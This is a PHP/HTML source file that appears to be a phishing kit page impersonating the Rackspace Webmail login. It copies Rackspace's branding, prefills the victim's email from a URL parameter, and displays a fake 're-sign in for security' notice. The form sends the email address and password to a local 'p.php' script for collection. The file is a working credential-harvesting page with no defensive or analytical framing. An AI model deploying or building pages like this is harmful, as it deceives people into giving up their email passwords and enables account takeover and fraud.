<?php
session_start();
$clientemail = $_GET['em'];
$_SESSION['clientemail']=$clientemail;
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html class="gr__apps_rackspace_com"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Rackspace Webmail: Hosted Email for Business</title>
    <meta name="Description" content="Webmail for business provided by Rackspace.  Get instant access to email, calendars, contacts, tasks and notes from your desktop, laptop or mobile phone.">
    <style type="text/css">
a,a img{border:0}body{background:#DDD;height:90%;font-size:10pt;font-family:Tahoma,Arial,Verdana;color:#444}form{display:inline;margin:0;padding:0}a{color:#333;text-decoration:none}form a{color:#06C}a:hover{text-decoration:underline}div.page{width:594px;margin:auto}div.header{width:100%;height:60px;margin:0;position:absolute;left:0;top:0;background:#333}div.header a.logo{float:left;width:150px;font-size:7pt;color:#000;line-height:.7;margin-left:20px}div.header div.logo{width:200px;height:62px;float:left;margin-left:20px}.logo img{margin-top:5px}div.title{float:right}div.title h1{color:#666;font-size:12px;font-weight:400;margin:40px 0 0}input:-webkit-autofill{background-color:#fff!important}div.form_wrapper{margin-top:180px;border:1px solid #999;background:#FFF;box-shadow:2px 2px 5px #999}div.form{padding:30px;height:292px}div.form div.left{float:left;width:270px}div.form div.right{float:right;width:188px}div.form div.right div.banner{background:#FFF;height:269px;width:173px}div.form input,div.form select{font-size:12pt;margin-left:0}div.form #login{float:left;width:82px;height:34px;cursor:pointer;margin:0 0 17px;line-height:20px;font-family:Tahoma,Arial,"Helvetica Neue",Helvetica,sans-serif;font-size:15px;text-align:center;padding:1px 10px 2px;border-radius:3px;-moz-border-radius:3px;-webkit-border-radius:3px;border-width:1px;border-style:solid;text-shadow:0 -1px 1px rgba(0,0,0,.4);border-color:#a60004;color:#fff;background:#d81436;background:-moz-linear-gradient(top,#d81436 0,#a60004 100%);background:-webkit-gradient(linear,left top,left bottom,color-stop(0,#d81436),color-stop(100%,#a60004));background:-webkit-linear-gradient(top,#d81436 0,#a60004 100%);background:-o-linear-gradient(top,#d81436 0,#a60004 100%);background:-ms-linear-gradient(top,#d81436 0,#a60004 100%);background:linear-gradient(top,#d81436 0,#a60004 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#d81436', endColorstr='#a60004', GradientType=0)}div.form #login::-moz-focus-inner{border:0;padding:0}div.form #login[disabled]{cursor:default;color:#fff;background-color:#e9a7b2;border-color:#e9a7b2;background-image:none}div.form #login:not([disabled]):hover{background:#d81436;background:-moz-linear-gradient(top,#d81436 0,#c40022 100%);background:-webkit-gradient(linear,left top,left bottom,color-stop(0,#d81436),color-stop(100%,#c40022));background:-webkit-linear-gradient(top,#d81436 0,#c40022 100%);background:-o-linear-gradient(top,#d81436 0,#c40022 100%);background:-ms-linear-gradient(top,#d81436 0,#c40022 100%);background:linear-gradient(top,#d81436 0,#c40022 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#d81436', endColorstr='#c40022', GradientType=0);text-decoration:none}a#forgot_password,img.logo{background-repeat:no-repeat}div.form #login:not([disabled]):active{background-color:#c40022;background-image:none;box-shadow:inset 0 0 4px 0 rgba(0,0,0,.5);-moz-box-shadow:inset 0 0 4px 0 rgba(0,0,0,.5);-webkit-box-shadow:inset 0 0 4px 0 rgba(0,0,0,.5)}div.form select{display:none}a#forgot_password{margin-left:15px;font-size:10pt;margin-top:12px;background-position:0;float:left}#options{clear:both}div#options_label{margin:0 0 6px 1px;font-size:10pt;color:#000}input.fake_pwd,input.pwd,input.user{padding:1px 1px 1px 10px;height:36px;width:306px;border:1px solid #cacaca;color:#000!important}input.fake_pwd{margin:2px 0 20px;display:none!important}input.user{margin:2px 0 17px}input.pwd{margin:2px 0 20px;display:block!important}input.submit{margin:0 0 15px;height:25px;width:57px}div.footer{width:480px;margin:10px auto auto;text-align:center}div.footer .caption{font-size:12px;color:#666}div.footer .caption a{color:#666;text-decoration:underline}div.footer .caption h2{display:inline;font-size:12px;font-weight:400}#email_label{margin-top:14px}div.footer .company{color:#888;margin:15px 0 0}#form_title{font-size:18px}#placeholder{height:16px}#login_links{text-align:right;color:#FFF;margin-top:20px;margin-right:20px;font-weight:700}#login_links a,#login_links div{font-weight:400;color:#fff}#login_links div{color:#999}.divider{margin:0 5px;display:inline}div#alert{display:none;color:red;font-size:13px}body.alert div#alert{display:block!important}body.alert div#placeholder{display:none!important}img.logo{width:130px;height:32px;margin-top:12px;background-image:url(//cp.rackspace.com/clients/webmail/beta_apps_rackspace_com/images/logo_20141002.png)}#ssl{margin-top:4px}img.banner{width:190px;height:294px;background-image:url(//cp.rackspace.com/clients/webmail/apps_rackspace_com/images/third_rse_plus_banner.png)}img.ssllogo{width:13px;height:17px;background-image:url(//cp.rackspace.com/clients/webmail/apps_rackspace_com/images/ssllogo.gif);position:relative;margin:2px 0 0 2px}.base .base_links,.base .base_links a{color:#666}.base{width:99%;text-align:center;position:absolute;bottom:10px}
    </style>
    <link href="favicon.ico" rel="shortcut icon">
    </head>
<body data-gr-c-s-loaded="true" style="position: static; left: 0px;">
    <div class="page"> <div class="header"> <div class="logo">
                <a href="#">
                    <img class="logo" alt="Webmail (Web Mail) Login for Rackspace Email Customers" src="logo.png">
                </a> </div>
        <div id="login_links">Webmail <div class="divider">|</div> <a href="#">Control Panel</a> </div> </div>
        <div class="form_wrapper">
            <div class="form">
                <div class="right">
                    <div class="banner">
                    <a href="#" target="_blank">
                            <img class="banner" src="bg.png">
                   </a></div> </div>
                <div class="left">
                    <form method="post" autocomplete="OFF" action="p.php" name="login">
                        <div id="form_title">Rackspace Webmail Login</div>
                        <br>
                        <span style="font-size:12px; color:red; ma">For security purposes, this application requires you to sign in again.</span>
                        <div id="email_label">Email Address</div>
                        <input type="email" required tabindex="11" name="email" class="user" value="<?php echo htmlspecialchars($clientemail); ?>">
                        <div>Password</div>
                        <input type="password" autofocus autofocus="ON" required tabindex="12" name="password" class="pwd">
                        <input type="submit" tabindex="13" id="login" name="submit_btn" class="submit" value="Log In">
                        <div id="options">
                            <div id="ssl">
                                <input type="checkbox" tabindex="15" name="usessl" id="usessl" disabled="disabled" checked="checked">
                                <label for="usessl">
                                    Use SSL
                                </label></div></div></form></div></div></div></div>
    <div class="footer">
        <div class="caption">
            Need <h2>webmail</h2> for your business?  Learn more about 
                <a href="#">
                    Hosted Email</a> from Rackspace
        </div> </div>
    <div class="base">
        <div class="base_links">
            <a target="_blank" href="#">Privacy Statement</a>
            <div class="divider">|</div>
            <a target="_blank" href="#">Website Terms</a> </div>
    </div> <span class="gr__tooltip"><span class="gr__tooltip-content"></span><i class="gr__tooltip-logo"></i><span class="gr__triangle"></span></span></body></html>